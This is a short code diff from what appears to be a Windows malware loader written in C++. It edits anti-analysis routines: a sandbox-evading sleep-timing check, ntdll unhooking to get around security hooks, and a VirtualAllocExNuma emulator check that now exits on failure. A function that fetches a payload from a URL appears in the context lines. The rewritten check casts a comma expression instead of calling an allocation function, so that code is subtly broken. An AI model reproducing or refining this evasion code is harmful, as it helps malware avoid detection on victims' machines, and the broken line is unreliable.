@@ -73,17 +73,10 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
 }
 
 BOOL CheckVirtualAllocExNuma(){
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32 == NULL) {
+    LPVOID mem = (LPVOID)(GetCurrentProcess(), NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
+    if (mem == NULL) {
         return FALSE;
     }
-
-    
-    FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, aVirtualAllocExNuma);
-    if (pVirtualAllocExNuma == NULL) {
-        return FALSE;
-    }
-
     return TRUE;
 }
 
@@ -129,7 +122,7 @@ void evade() {
     if (elapsedTime.count() < 1.5)
     {
         printf("Sleep duration is too short.\n");
-        exit(0);
+        exit(1);
     }
 
     unhookNtll();
@@ -145,7 +138,9 @@ void evade() {
 		exit(1);
 	}
     
-    CheckVirtualAllocExNuma();  
+    if (!CheckVirtualAllocExNuma()) {
+        exit(1);
+    }
 };
 
 int main() {
